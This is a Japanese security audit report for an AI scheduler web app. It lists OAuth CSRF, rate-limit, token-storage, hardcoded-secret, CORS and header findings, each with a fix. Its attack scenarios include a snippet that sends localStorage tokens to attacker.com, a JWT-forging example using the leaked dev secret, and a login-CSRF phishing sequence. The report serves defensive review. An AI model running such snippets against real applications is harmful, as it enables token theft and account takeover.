# AI Assistant Scheduler 総合セキュリティレポート

**診断日**: 2026-01-03
**対象**: `/home/user/ai-assistant-scheduler`
**プロジェクト構成**: Hono (Cloudflare Workers) + React (Vite) モノレポ
**診断手法**: 静的コードレビュー × 2 + 攻撃者シミュレーション × 1

---

## エグゼクティブサマリー

| 重大度 | 件数 |
|--------|------|
| 🔴 Critical | 1 |
| 🟠 High | 3 |
| 🟡 Medium | 2 |
| 🟢 Low | 3 |

**総合評価**: **B** - 基本的なセキュリティ対策は実装されているが、OAuth認証フローに重大な脆弱性あり

---

## 🔴 Critical (即座に修正が必要)

### 1. OAuth state パラメータの欠如 - CSRF攻撃に対する脆弱性

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/frontend/src/components/Auth/LoginPage.tsx:9-18`<br>`packages/frontend/src/components/Auth/AuthCallback.tsx:10-43` |
| **診断一致** | レビューA ✓ / レビューB ✓ / 攻撃シミュ ✓ |

**問題**: Google OAuth認証フローで `state` パラメータが生成・検証されていない

```typescript
// LoginPage.tsx - state パラメータがない
const getGoogleOAuthUrl = () => {
  const params = new URLSearchParams({
    client_id: GOOGLE_CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: "code",
    scope: "email profile",
    access_type: "offline",
    prompt: "consent",
    // ❌ state パラメータが欠如
  });
  return `https://accounts.google.com/o/oauth2/v2/auth?${params.toString()}`;
};
```

**攻撃シナリオ** (攻撃シミュレーションより):
```
1. 攻撃者が自分のGoogleアカウントで認証コードを取得
2. 被害者にフィッシングメールを送信:「スケジュールを確認してください」
3. リンク: https://app.example.com/auth/callback?code=攻撃者の認証コード
4. 被害者がクリック → 攻撃者のアカウントでログイン
5. 被害者が機密性の高いスケジュール（医療、法律相談等）を入力
6. 攻撃者が自分のアカウントで被害者のデータを閲覧
```

**修正方法**:
```typescript
// LoginPage.tsx
const getGoogleOAuthUrl = () => {
  const state = crypto.randomUUID();
  sessionStorage.setItem('oauth_state', state);

  const params = new URLSearchParams({
    client_id: GOOGLE_CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: "code",
    scope: "email profile",
    access_type: "offline",
    prompt: "consent",
    state: state,  // ✅ stateパラメータを追加
  });
  return `https://accounts.google.com/o/oauth2/v2/auth?${params.toString()}`;
};

// AuthCallback.tsx
useEffect(() => {
  const handleCallback = async () => {
    const params = new URLSearchParams(window.location.search);
    const code = params.get("code");
    const returnedState = params.get("state");
    const savedState = sessionStorage.getItem('oauth_state');

    // ✅ stateの検証
    if (!returnedState || returnedState !== savedState) {
      window.location.href = "/?error=不正なリクエストです";
      return;
    }
    sessionStorage.removeItem('oauth_state');
    // ... 残りの処理
  };
}, [login]);
```

---

## 🟠 High (早急に対応すべき)

### 1. 認証エンドポイントのレート制限欠如

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/backend/src/feature/auth/route.ts` |
| **診断一致** | レビューA ✓ / レビューB ✓ |

**問題**: `/api/auth/google`, `/api/auth/refresh`, `/api/auth/logout` にレート制限がない

**リスク**:
- ブルートフォース攻撃による認証コード推測
- リフレッシュトークンの総当たり試行
- 認証システムへのDoS攻撃

**修正方法**:
```typescript
// middleware/rateLimit.ts に追加
export const authRateLimitMiddleware = createRateLimitMiddleware({
  maxRequests: 10,
  windowMs: 60 * 1000, // 1分間に10リクエスト
  keyPrefix: "auth_rate_limit",
});

// route.ts に適用
app.use("/google", authRateLimitMiddleware);
app.use("/refresh", authRateLimitMiddleware);
```

---

### 2. localStorageへのトークン保存

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/frontend/src/contexts/AuthContext.tsx:200-202` |
| **診断一致** | レビューA ✓ / レビューB ✓ / 攻撃シミュ ✓ |

**問題**: アクセストークンとリフレッシュトークンがlocalStorageに保存されている

```typescript
localStorage.setItem(ACCESS_TOKEN_KEY, result.data.accessToken);
localStorage.setItem(REFRESH_TOKEN_KEY, result.data.refreshToken); // 30日間有効
```

**攻撃シナリオ** (XSS脆弱性が存在した場合):
```javascript
const accessToken = localStorage.getItem('auth_access_token');
const refreshToken = localStorage.getItem('auth_refresh_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ accessToken, refreshToken })
});
```

**修正方法** (推奨順):
1. **HttpOnly Cookie使用** (最も安全): バックエンドでHttpOnly, Secure, SameSite=Strict属性付きCookieを設定
2. **アクセストークン短命化**: 1時間 → 15分に短縮
3. **リフレッシュトークンのIP/UA検証**: 発行時の情報を記録して検証

---

### 3. wrangler.tomlに開発用シークレットがハードコード

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/backend/wrangler.toml:23` |
| **診断一致** | レビューA ✓ / レビューB ✓ / 攻撃シミュ ✓ |

**問題**: JWT_SECRETが開発用の値としてハードコードされている

```toml
[vars]
JWT_SECRET = "dev-jwt-secret-change-in-production"
```

**攻撃シナリオ** (本番で誤用された場合):
```javascript
// 攻撃者がこのシークレットでJWTを偽造
const forgedToken = jwt.sign({
  sub: "victim-user-id",
  email: "victim@example.com",
  type: "access"
}, "dev-jwt-secret-change-in-production");
// → 全ユーザーのアカウント乗っ取り可能
```

**修正方法**:
1. `wrangler.toml` から `JWT_SECRET` を削除
2. ローカル開発用に `.dev.vars` ファイルを使用
3. 本番環境では `wrangler secret put JWT_SECRET` を実行

---

## 🟡 Medium

### 1. CORS設定で開発環境のlocalhost全許可

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/backend/src/index.ts:27-29` |

**問題**: `origin.startsWith("http://localhost:")` で任意のポートが許可される

**修正方法**: 許可するポートを明示的に指定
```typescript
const ALLOWED_DEV_PORTS = [5173, 3000, 6006];
if (origin.startsWith("http://localhost:")) {
  const port = parseInt(origin.split(":")[2], 10);
  if (ALLOWED_DEV_PORTS.includes(port)) {
    return origin;
  }
}
```

---

### 2. セキュリティヘッダー未設定

| 項目 | 内容 |
|------|------|
| **ファイル** | `packages/backend/src/index.ts` |

**問題**: CSP、X-Frame-Options、HSTS等のセキュリティヘッダーが未設定

**修正方法**:
```typescript
import { secureHeaders } from "hono/secure-headers";

app.use("*", secureHeaders({
  xFrameOptions: "DENY",
  xContentTypeOptions: "nosniff",
  strictTransportSecurity: "max-age=31536000; includeSubDomains",
  referrerPolicy: "strict-origin-when-cross-origin",
}));
```

---

## 🟢 Low

| 脆弱性 | ファイル | 備考 |
|--------|----------|------|
| PKCE未実装 | `LoginPage.tsx` | SPAではPKCE推奨だが、stateと組み合わせでリスク軽減 |
| ログアウト時のサーバー通知なし | `AuthContext.tsx:208-214` | logout APIを呼び出していない |
| CSP未設定 (フロントエンド) | `public/_headers` | Cloudflare Pagesで設定が必要 |

---

## ✅ 良好なセキュリティ対策（実装済み）

全レビューで確認された適切な実装:

| カテゴリ | 実装 | ファイル |
|---------|------|---------|
| **IDOR対策** | `findByIdAndUserId` で所有権チェック | `scheduleRepo.ts`, `updateSchedule.ts` |
| **SQLインジェクション対策** | Drizzle ORMによるパラメータ化クエリ | 全リポジトリファイル |
| **入力検証** | Zodスキーマによるサーバーサイドバリデーション | `@ai-scheduler/shared` |
| **XSS対策** | DOMPurifyによるHTMLサニタイズ | `MarkdownRenderer.tsx:29` |
| **外部リンク** | `rel="noopener noreferrer"` 属性付き | `MarkdownRenderer.tsx:16` |
| **トークンローテーション** | リフレッシュトークン使用時に古いトークンを失効 | `refreshToken.ts:55` |
| **メール検証** | `verified_email` チェック | `google.ts:93-98` |
| **リダイレクトURI検証** | 許可リストによる検証 | `redirectUri.ts` |
| **AIレート制限** | 1時間あたり10リクエスト制限 | `rateLimit.ts` |
| **本番ログ保護** | スタックトレースを除外 | `logger.ts:62-69` |
| **JWTトークン分離** | access/refreshの型を明示的に分離 | `jwt.ts` |

---

## 攻撃者視点: 最も危険な攻撃経路 TOP 3

### 🥇 1位: OAuth state欠如によるCSRF/セッション固定攻撃

**危険度**: Critical
**成功可能性**: 高
**影響**: アカウント乗っ取り、機密データ漏洩

### 🥈 2位: 開発用JWT_SECRETのハードコード

**危険度**: Critical（本番で誤用された場合）
**成功可能性**: 条件付き（本番デプロイ時の設定ミス）
**影響**: 全ユーザーのアカウント乗っ取り

### 🥉 3位: localStorageへのトークン保存 + XSS連鎖攻撃

**危険度**: High
**成功可能性**: 条件付き（XSS脆弱性の存在が前提）
**影響**: 長期間（30日）のアカウント乗っ取り

---

## 推奨アクション（優先度順）

| 優先度 | アクション | 工数目安 |
|--------|----------|---------|
| 1 | OAuth stateパラメータの実装 | 小 |
| 2 | 認証エンドポイントへのレート制限追加 | 小 |
| 3 | JWT_SECRETを.dev.varsに移動 | 小 |
| 4 | セキュリティヘッダーの追加 | 小 |
| 5 | トークン保存方式の見直し（HttpOnly Cookie検討） | 中〜大 |

---

## 付録: 診断結果比較

| 脆弱性 | レビューA | レビューB | 攻撃シミュ |
|--------|-----------|-----------|-----------|
| OAuth state欠如 | Critical | Critical | TOP 1 |
| 認証レート制限なし | High | High | - |
| localStorage保存 | High | High | TOP 3 |
| JWT_SECRET露出 | Medium | High | TOP 2 |
| CORS緩和 | Medium | Medium | - |
| セキュリティヘッダー | Medium | Medium | - |
| PKCE未実装 | - | Low | - |
| ログアウトAPI未呼出 | - | Low | - |

---

**レポート作成**: セキュリティレビュアー × 2 + 攻撃シミュレーター × 1
**最終更新**: 2026-01-03
